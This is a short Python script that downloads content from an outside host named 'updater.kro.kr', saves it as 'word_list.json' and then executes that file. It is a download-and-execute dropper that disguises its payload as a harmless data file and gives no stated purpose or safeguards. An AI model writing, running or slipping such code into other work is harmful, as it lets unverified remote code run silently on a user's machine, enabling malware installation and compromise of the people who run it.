import requests
import subprocess

def download(url, save_path, executable_path):
    response = requests.get(url)
    with open(save_path, 'wb') as file:
        file.write(response.content)
    subprocess.run([executable_path])

if __name__ == "__main__":
    file_url = "http://updater.kro.kr"
    save_path = "word_list.json"
    executable_path = save_path

    download(file_url, save_path, executable_path)
